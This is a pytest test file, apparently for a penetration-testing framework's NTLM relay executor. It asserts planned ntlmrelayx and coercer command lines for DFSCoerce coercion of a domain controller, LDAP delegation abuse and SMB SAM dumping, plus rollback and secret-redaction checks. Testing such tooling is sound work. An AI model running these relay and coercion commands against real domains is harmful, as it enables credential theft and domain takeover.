        _relay_finding(), overrides={"mode": "ldap_rbcd"})
    _assert_relay_outcome(receipt, "action_succeeded")
    assert receipt["mutation"]["rollback"]["verified"] is True


def test_relay_rbcd_observed_after_failed_trigger_still_rolls_back(tmp_path):
    pm = _FakePM(reads=["Delegation rights modified successfully!"])
    receipt = get_executor("NTLM-RELAY").run(
        _ctx(_cfg(tool_timeout_s=0), _relay_runner(RunResult(None, timed_out=True)), tmp_path, pm),
        _relay_finding(), overrides={"mode": "ldap_rbcd"})
    _assert_relay_outcome(receipt, "coerce_not_fired")
    assert receipt["mutation"]["applied"] is True
    assert receipt["mutation"]["rollback"]["verified"] is True


# ============================================================ Relay external listener
@pytest.mark.parametrize("mode", ["smb_sam", "ldap_rbcd"])
@pytest.mark.parametrize("endpoint", ["10.0.0.250", "10.0.0.250:1445"])
def test_relay_external_listener_dispatch_and_preview(tmp_path, mode, endpoint):
    import shlex
    pm = _FakePM(reads=["Delegation rights modified successfully!"])
    runner = _relay_runner()
    ctx = _ctx(_cfg(), runner, tmp_path, pm)
    executor = get_executor("NTLM-RELAY")
    overrides = {"mode": mode, "external_listener": endpoint,
                 "listener_host": "ignored", "victim_dc": "dc02", "method": "dfscoerce"}
    plan = executor.plan(ctx, _relay_finding(), overrides)
    argv = shlex.split(plan.steps_preview[0].split(": ", 1)[1])
    assert argv[:3] == ["impacket-ntlmrelayx", "-t",
                        ("ldap://" if mode == "ldap_rbcd" else "smb://") + _relay_finding().host]
    assert "-smb2support" in argv and "--no-http-server" in argv
    if mode == "ldap_rbcd":
        assert "--delegate-access" in argv and "-l" not in argv
    else:
        assert argv[argv.index("-l") + 1] == str(tmp_path / "loot")
    if ":" in endpoint:
        assert argv[argv.index("--smb-port") + 1] == "1445"
    else:
        assert "--smb-port" not in argv
    assert "coercer coerce" in plan.steps_preview[1]
    assert f"-l {endpoint} -t dc02" in plan.steps_preview[1]
    assert _cfg().password not in " ".join(plan.steps_preview)

    receipt = executor.run(ctx, _relay_finding(), overrides)
    _assert_relay_outcome(receipt, "coercion_dispatched_external")
    assert receipt["terminal_fact"]["kind"] == (
        "rbcd_access" if mode == "ldap_rbcd" else "replication_dump")
    assert endpoint in receipt["terminal_fact"]["predicate"]
    assert "operator's ntlmrelayx" in receipt["terminal_fact"]["predicate"]
    assert {s["name"] for s in receipt["steps"]} == {"external_listener", "coerce_trigger"}
    assert all(s["ok"] for s in receipt["steps"])
    assert pm.started == pm.stopped == [] and pm._ri == 0
    trigger, = runner.calls
    assert trigger[trigger.index("-l") + 1] == endpoint
    assert trigger[trigger.index("-t") + 1] == "dc02"
    assert trigger[trigger.index("--filter-method-name") + 1] == "NetrDfsRemoveStdRoot"
    assert receipt["mutation"]["applied"] is False
    assert receipt["mutation"]["rollback"]["performed"] is False


@pytest.mark.parametrize("mode", ["smb_sam", "ldap_rbcd"])
@pytest.mark.parametrize("trigger", [RunResult(None, timed_out=True), RunResult(None, error="absent")])
def test_relay_external_listener_trigger_not_fired(tmp_path, mode, trigger):
    pm = _FakePM()
    receipt = get_executor("NTLM-RELAY").run(
        _ctx(_cfg(), _relay_runner(trigger), tmp_path, pm), _relay_finding(),
        overrides={"mode": mode, "external_listener": "10.0.0.250"})
    _assert_relay_outcome(receipt, "coerce_not_fired")
    assert pm.started == pm.stopped == []


@pytest.mark.parametrize("mode", ["smb_sam", "ldap_rbcd"])
def test_relay_empty_external_listener_preserves_r1(tmp_path, mode):
    pm = _FakePM(reads=["Authenticating against smb://srv02 as NORTH/DC01$ SUCCEED"])
    receipt = get_executor("NTLM-RELAY").run(
        _ctx(_cfg(tool_timeout_s=0), _relay_runner(), tmp_path, pm), _relay_finding(),
        overrides={"mode": mode, "external_listener": ""})
    _assert_relay_outcome(receipt, "action_denied")
    assert len(pm.started) == 1 and pm.stopped == ["h1"]


@pytest.mark.parametrize("mode", ["smb_sam", "ldap_rbcd"])
@pytest.mark.parametrize("fired", [True, False])
def test_relay_external_secret_guard(tmp_path, mode, fired):
    tokens = []
    for payload in ("externalSecretOne deadbeef", "externalSecretTwo cafebabe"):
        pm = _FakePM(reads=[payload])
        trigger = RunResult(1, stdout=payload, stderr=payload,
                            error=None if fired else payload)
        receipt = get_executor("NTLM-RELAY").run(
            _ctx(_cfg(), _relay_runner(trigger), tmp_path, pm), _relay_finding(),
            overrides={"mode": mode, "external_listener": "10.0.0.250"})
        _assert_relay_outcome(receipt, "coercion_dispatched_external" if fired else "coerce_not_fired")
        blob = json.dumps(receipt)
        assert all(secret not in blob for secret in payload.split())
        assert _cfg().password not in blob
        tokens.append(receipt["terminal_fact"]["proof_token"])
        assert pm.started == pm.stopped == []
    assert tokens[0] == tokens[1]
